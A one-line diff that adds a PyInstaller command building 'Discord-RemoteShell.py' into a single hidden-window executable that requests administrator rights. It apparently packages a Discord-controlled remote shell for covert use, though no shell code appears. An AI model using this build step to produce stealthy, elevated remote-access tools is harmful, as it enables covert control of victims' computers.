@@ -1,0 +1,1 @@
+pyinstaller Discord-RemoteShell.py --onefile --noconsole --uac-admin
